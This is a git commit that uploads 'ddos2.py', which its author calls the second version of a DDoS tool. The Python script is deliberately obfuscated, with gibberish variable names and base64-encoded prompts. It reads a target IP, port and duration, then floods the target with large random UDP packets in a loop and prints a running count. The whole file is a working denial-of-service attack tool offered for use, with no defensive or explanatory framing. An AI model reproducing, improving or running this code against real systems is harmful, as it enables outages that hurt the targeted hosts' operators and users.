6b674e1943c8f0797fe02fdbb59bc0d2a1b2ca0f
Iceyzx <107702272+CnmIceyzx@users.noreply.github.com>
2022-07-29 19:18:16 +0700

    Add files via upload
    second version of the ddos tool

---
+++ ddos2.py
@@ -0,0 +1,26 @@
+import base64, socket, time, random, os, sys, re
+from colored import fg, bg, attr
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ajdnjnfjkasnfjnnjndnJWifjIWOAJIOWJIOFJWIAOFJWAFJawjifjifjij,afnjknwjJJNJNSJNJSNDJKNJDNJNJDNJSNDKJN,fnasjfnakjnfkwnfawfnwfnjwnfjanfjanwjfnakjwfnkjanf,sajdndsdnajdsnhdshdbhsabhdbshdbshdbh='RW50ZXIgSVA6IA==','RW50ZXIgUG9ydDog','RW50ZXIgRHVyYXRpb246IA==','RW500ZXIgSJDNJsndja=='
+JSDNKJnjknjnJNJNDAJNDJNjnjjsndjnjsnjnadjnjNJDNJNDnkjndjndjkndjkNDJndjnJJDNjsjijicp,PAODPPIKOWOQIOPDOKODksofkosafkoadskfpokOAKOKDOPADK,asjnjfjasfokpokoapqkopkaokfopwkfokKAOKDOPKSDKOKSDKODKODSKKOPAPDPADDPSDJjnfndjfnjkanwfndisjfoijdfjfiIJAIJIDJSJDIJSDIJPDJIOJIPOISIDIOUIOCIUICUSIOCUUCISUCsicuisuaisufiajionkowndknwfjnknvmndsmvndsmvnskmvnskjnvjkfnkj=base64.b64decode(ajdnjnfjkasnfjnnjndnJWifjIWOAJIOWJIOFJWIAOFJWAFJawjifjifjij),base64.b64decode(afnjknwjJJNJNSJNJSNDJKNJDNJNJDNJSNDKJN), base64.b64decode(fnasjfnakjnfkwnfawfnwfnjwnfjanfjanwjfnakjwfnkjanf)
+JSDNKJnjknjnJNJNDAJNDJNjnjjsndjnjsnjnadjnjNJDNJNDnkjndjndjkndjkNDJndjnJJDNjsjfjnfajnfjnfjicp=str(JSDNKJnjknjnJNJNDAJNDJNjnjjsndjnjsnjnadjnjNJDNJNDnkjndjndjkndjkNDJndjnJJDNjsjijicp).replace('b', '').replace("'", '')
+PAODPPIKOWOQIOPDOKODksofkosafkoadskfpokOAKOKNDJSNJNjnfnfPADK=str(PAODPPIKOWOQIOPDOKODksofkosafkoadskfpokOAKOKDOPADK).replace('b', '').replace("'", '')
+asjnjfjasfokpokoapqkopkaokfopwkfokKAOKDOPKSDKOKSDKODKODSKKOPAPDPADDPSDJjnfndjfnjkanwfndisjfoijdfjfiIJAIJIDJSJDIJSDIJPDJIOJIPOISIDIOUIOCIUICUSIOCUUCISUCsicuisuaisufiajionkowndknwfjnknvmndsmvndsmvsaofjsfnnjfnJNJDKNSJNSskmvnskjnvjkfnkj=str(asjnjfjasfokpokoapqkopkaokfopwkfokKAOKDOPKSDKOKSDKODKODSKKOPAPDPADDPSDJjnfndjfnjkanwfndisjfoijdfjfiIJAIJIDJSJDIJSDIJPDJIOJIPOISIDIOUIOCIUICUSIOCUUCISUCsicuisuaisufiajionkowndknwfjnknvmndsmvndsmvnskmvnskjnvjkfnkj).replace('b', '').replace("'", '')
+z,y,x=input(JSDNKJnjknjnJNJNDAJNDJNjnjjsndjnjsnjnadjnjNJDNJNDnkjndjndjkndjkNDJndjnJJDNjsjfjnfajnfjnfjicp),input(PAODPPIKOWOQIOPDOKODksofkosafkoadskfpokOAKOKNDJSNJNjnfnfPADK),int(input(asjnjfjasfokpokoapqkopkaokfopwkfokKAOKDOPKSDKOKSDKODKODSKKOPAPDPADDPSDJjnfndjfnjkanwfndisjfoijdfjfiIJAIJIDJSJDIJSDIJPDJIOJIPOISIDIOUIOCIUICUSIOCUUCISUCsicuisuaisufiajionkowndknwfjnknvmndsmvndsmvsaofjsfnnjfnJNJDKNSJNSskmvnskjnvjkfnkj))
+a,tmt,snt=random._urandom(20000),time.time()+float(x),0
+dhdfdfdfdf,anffndksdfndsfdsbfnfsdnffbdsn,dkjfdsnfkdsfdnsfksnfwafbefebfbkeF='U0VOVA==','UEFDS0VUUyBUTw==','VEhST1VHSCBQT1JU'
+dhfidf,anffndkfafdf,dkjfdsnfkdsfnsdf=base64.b64decode(dhdfdfdfdf),base64.b64decode(anffndksdfndsfdsbfnfsdnffbdsn),base64.b64decode(dkjfdsnfkdsfdnsfksnfwafbefebfbkeF)
+dhKAJNDNJSNFmfidf=str(dhfidf).replace('b', '').replace("'", '')
+anffndkfanjsnMJKNSFKJNJSFNdmfnmdffdf=str(anffndkfafdf).replace('b', '').replace("'", '')
+anffndkfanjsnfjsffdf=str(dkjfdsnfkdsfnsdf).replace('b', '').replace("'", '')
+while 82348349328432948249 >= 82348349328431948249:
+    ttstpasdnsdnsdnad=f'{dhKAJNDNJSNFmfidf}\x20{snt}\x20{anffndkfanjsnMJKNSFKJNJSFNdmfnmdffdf}\x20{z}\x20{anffndkfanjsnfjsffdf}\x20{y}'
+    tajdjnsdjnsjdnasdnmabsndsadbasndmbdsman = ttstpasdnsdnsdnad
+    if time.time() > tmt:
+    	break
+    else:
+    	pass
+    sock.sendto(a,(z,int(y)))
+    snt+=1
+    print(ttstpasdnsdnsdnad)
+ianskdnasjndjsNADJNAKJDNKJANDKJNJNDJnksnfmSNFJKNSKJFNKJSNJNFKJnaskfjadkfjandfjnjNJNNSNJFNJSFNKJFNJFFJNJFNkajskfjnsjkfnkjasnfkjnJNJNAJNDJNAJDNJANJKDNKdsfawpkjpoqwkfopwfpokposakfcpoksdomMAKDMPOAMPOJSPOFJSOPFJPOSMFPOmfsmfkanfwnfpnwapfnwafnwanfpainfonfwopqnpnfpownqfponafnaspkfnakfnaksfnposnfponpoJFNJKNFkd=input(f'\x0a{ttstpasdnsdnsdnad}')
